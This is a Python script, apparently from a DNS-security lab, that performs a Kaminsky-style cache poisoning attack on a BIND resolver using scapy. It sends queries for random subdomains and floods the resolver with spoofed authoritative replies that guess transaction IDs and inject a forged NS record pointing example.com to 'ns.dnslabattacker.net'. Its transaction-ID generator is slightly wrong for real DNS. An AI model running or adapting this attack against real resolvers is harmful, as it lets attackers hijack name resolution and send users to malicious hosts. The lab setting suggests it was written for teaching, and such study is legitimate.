#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

def poisonCache(bind_ip, bind_port, query_port):
    """Attempt to poison the DNS cache."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    while True:
        # Generate a random subdomain for each iteration
        subdomain = getRandomSubDomain() + ".example.com"
        
        query = DNS(rd=1, qd=DNSQR(qname=subdomain)) # construct DNS query
        sendPacket(sock, query, bind_ip, bind_port) # send the original DNS query to trigger the BIND server to look up the subdomain
        
        print("Attempted poisoning for subdomain: {}".format(subdomain))

        # Flood the BIND server with spoofed responses
        for _ in range(50): # Number of attempts can be adjusted
            spoof_dns_reply = DNS(
                id=getRandomTXID(),
                aa=1,
                qr=1,
                qdcount=1,
                qd=DNSQR(qname=subdomain, qtype='A'),
                ancount=1, 
                an=DNSRR(rrname=subdomain, type='A', rdata="1.2.3.4", ttl=86400),
                nscount=1, 
                ns=DNSRR(rrname='example.com', type='NS', ttl=86400, rdata='ns.dnslabattacker.net'),
            )
            sendPacket(sock, spoof_dns_reply, bind_ip, query_port)
        
        packet = sock.recv(4096)
        
        packet = DNS(packet)
        if packet[DNS].ns and packet[DNS].ns.rdata == 'ns.dnslabattacker.net.': # maybe use rcode for success/failure
            print("Success")
            break

if __name__ == '__main__':
    poisonCache(my_ip, my_port, my_query_port)
